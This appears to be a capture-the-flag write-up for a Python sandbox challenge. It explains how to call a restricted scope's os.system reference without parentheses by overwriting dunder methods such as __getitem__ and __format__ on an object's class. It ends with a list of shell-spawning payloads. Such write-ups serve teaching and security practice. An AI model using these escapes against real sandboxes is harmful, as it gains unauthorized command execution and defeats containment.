# Solution

The goal of this challenge is to call a function in Python without using parentheses. This might seem impossible at first, as most traditional function calls in Python are done via `()`.

However, a lot of special operators and other behavior in Python can be controlled by magic methods. These methods, when defined on a class, let a programmer implement custom behavior for differnt parts of the Python language syntax, such as accessing a list element. Here is an example:

```python
>>> class Test:
...     def __getitem__(self, index):
...         print(f'You call __getitem__ with {index}')
...
>>> t = Test()
>>> t[1]
You call __getitem__ with 1
>>> t['hello']
You call __getitem__ with hello
```

Because these magic methods are surrounded by `__`, they are also sometimes referred to as dunder methods. There are a ton of different dunder methods you can override; for a nice reference, look [here](https://rszalski.github.io/magicmethods/).

The challenge sandbox is set up in way to let you execute Python code without access to many builtins; the relevant code from the challenge is:

```python
scope = {
    '__builtins__': {
        'call_me_maybe': os.system,
        'x': X(),
    }
}
```

The scope is limited because the sandbox has overriden the `__builtins__` global to give you access to only two things: a reference to `os.system` (which lets you execute arbitrary commands), and a reference to an instance of an empty class. The goal then becomes clear: we must somehow modify `x` to call `call_me_maybe` (the reference to `os.system`).

Our tools seem limited, but access to an instance of a class is a powerful primitive when combined with our knowledge of dunder methods. We can also access `x`'s underlying class definition (the `X` class) by accessing its `__class__` attribute, and can then set arbitrary class attributes. This is best understood with an example:

```python
>>> x.__class__
<class '__main__.main.<locals>.X'>
>>> x.__class__.test = 1234
>>> x.__class__.test
1234
```

Now, imagine that instead of a non-existent `test` attribute, we instead overwrite the definition of a dunder method that can help us achieve code execution. Here is another `__getitem__` example:

```python
>>> x.__class__.__getitem__ = lambda a, b: 'You called __getitem__'
>>> x['test']
'You called __getitem__'
```

So, instead of overwriting `__getitem__` with a not-very-helpful function, we can instead overwrite it with `call_me_maybe`. Then, any argument we passed in `[]` will be the argument passed to `os.system`:

```python
>>> x.__class__.__getitem__ = call_me_maybe
>>> x['sh']
$
```

This line of thought can be extended to a few other dunder methods. A non-comprehensive list of valid shell-popping payloads follows:

```python
x.__class__.__getitem__ = call_me_maybe; x['sh']
x.__class__.__getattr__ = call_me_maybe; x.sh
x.__class__.__getattribute__ = call_me_maybe; x.sh
x.__class__.__class_getitem__ = call_me_maybe; x.__class__['sh']
x.__class__.__format__ = call_me_maybe; f'{x:sh}'
```